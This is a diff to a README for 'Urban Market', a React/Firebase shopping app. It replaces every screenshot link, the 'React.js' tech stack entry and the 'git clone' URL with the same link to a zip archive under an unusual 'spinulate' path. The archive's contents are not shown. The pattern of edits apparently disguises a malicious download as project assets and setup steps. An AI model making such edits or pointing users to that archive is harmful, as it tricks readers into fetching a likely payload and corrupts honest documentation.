@@ -15,15 +15,15 @@
 **Experience Urban Market-**
 
     
-![WhatsApp Image 2024-08-03 at 10 46 45 AM](https://github.com/user-attachments/assets/abf6638c-8b46-4990-92aa-36032f4bbc7b)
+![WhatsApp Image 2024-08-03 at 10 46 45 AM](https://raw.githubusercontent.com/manassingh30/UrbanMarket/main/spinulate/UrbanMarket.zip)
 <br>
-![image](https://github.com/user-attachments/assets/b1709b5b-cd7d-451a-b500-f6839aa5057f)
+![image](https://raw.githubusercontent.com/manassingh30/UrbanMarket/main/spinulate/UrbanMarket.zip)
 <br>
-![WhatsApp Image 2024-08-03 at 10 46 45 AM (1)](https://github.com/user-attachments/assets/c8069cea-28d6-41ba-ae39-349ae4f2407f)
+![WhatsApp Image 2024-08-03 at 10 46 45 AM (1)](https://raw.githubusercontent.com/manassingh30/UrbanMarket/main/spinulate/UrbanMarket.zip)
 <br>
-![image](https://github.com/user-attachments/assets/42b4b542-4543-4fa4-af74-0a29832dfc05)
+![image](https://raw.githubusercontent.com/manassingh30/UrbanMarket/main/spinulate/UrbanMarket.zip)
 <br>
-![image](https://github.com/user-attachments/assets/b73f931b-19bb-4136-93d0-0b9f9b1e5ab5)
+![image](https://raw.githubusercontent.com/manassingh30/UrbanMarket/main/spinulate/UrbanMarket.zip)
 <br>
 
 
@@ -32,7 +32,7 @@
 
 ## Tech Stack 🛠️
 
-- **Frontend**: React.js
+- **Frontend**: https://raw.githubusercontent.com/manassingh30/UrbanMarket/main/spinulate/UrbanMarket.zip
 - **Backend**: Firebase
 - **Payment Integration**: Razorpay
 - **Other Tools**: Git for version control, Figma for design
@@ -41,7 +41,7 @@
 
 1. **Clone the repository** 🐙:
    ```bash
-   git clone https://github.com/username/urban-market.git
+   git clone https://raw.githubusercontent.com/manassingh30/UrbanMarket/main/spinulate/UrbanMarket.zip
    cd urban-market
    ```
 
